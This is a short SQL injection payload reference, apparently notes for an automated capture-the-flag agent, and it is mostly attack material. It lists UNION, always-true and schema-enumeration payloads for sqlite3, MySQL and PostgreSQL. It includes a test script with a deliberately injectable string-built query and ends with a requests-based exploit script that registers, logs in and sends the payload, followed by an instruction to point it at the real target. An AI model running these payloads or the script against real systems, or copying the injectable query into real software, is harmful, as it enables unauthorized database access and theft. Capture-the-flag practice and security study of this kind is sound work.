# SQLi Payload Reference (Whitebox)

## DB Engine Capability Table

| DB | UNION | Blind | Error | Stacked |
|----|-------|-------|-------|---------|
| sqlite3 | ✓ | ✓ | limited | ✗ |
| MySQL | ✓ | ✓ | ✓ | ✓ |
| PostgreSQL | ✓ | ✓ | ✓ | ✓ (COPY) |

## Payload Reference by DB Engine

```
# sqlite3
UNION SELECT null,flag FROM users--
' OR 1=1--
1 AND 1=2 UNION SELECT tbl_name,sql FROM sqlite_master--

# MySQL
UNION SELECT null,flag FROM users-- -
' OR '1'='1
1 AND 1=2 UNION SELECT table_name,column_name FROM information_schema.columns-- -

# PostgreSQL
UNION SELECT null,flag FROM users--
' OR '1'='1
1 AND 1=2 UNION SELECT table_name,column_name FROM information_schema.tables--
```

## Type Cast Bypass Check

If source has `<int:param>` or `int(param)`:
```python
try:
    int("1 UNION SELECT--")  # raises ValueError → string payloads blocked
    int("1")                  # valid
except ValueError:
    print("int() cast blocks string payloads")
    print("Use: numeric blind SQLi instead")
    # 1 AND 1=1 → True (returns row)
    # 1 AND 1=2 → False (returns nothing)
    # → confirm blind, then boolean or time-based extraction
```

## Isolation Test

```python
# /tmp/aurelinth/test_sqli_isolation.py
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE notes (id INTEGER, content TEXT)")
db.execute("INSERT INTO notes VALUES (1, 'picoCTF{test_flag}')")

user_input = "0 UNION SELECT 1,content FROM notes WHERE id=1--"
try:
    result = db.execute(f"SELECT * FROM notes WHERE id = {user_input}").fetchall()
    print("CONFIRMED:", result)
except Exception as e:
    print("BLOCKED:", e)
```

## Exploit Script

```python
# /tmp/aurelinth/exploit_sqli.py
import requests

BASE = "http://LOCAL_TARGET"
s = requests.Session()

s.post(f"{BASE}/register", data={"username": "pwn", "password": "pwn"})
s.post(f"{BASE}/login", data={"username": "pwn", "password": "pwn"})

# Adjust payload for DB engine and column count (from source)
payload = "0 UNION SELECT 1,content FROM notes WHERE id=1--"

r = s.get(f"{BASE}/note/{payload}")
print("[local]", r.status_code, r.text[:300])
```

Change `BASE` to real target URL for final attack.
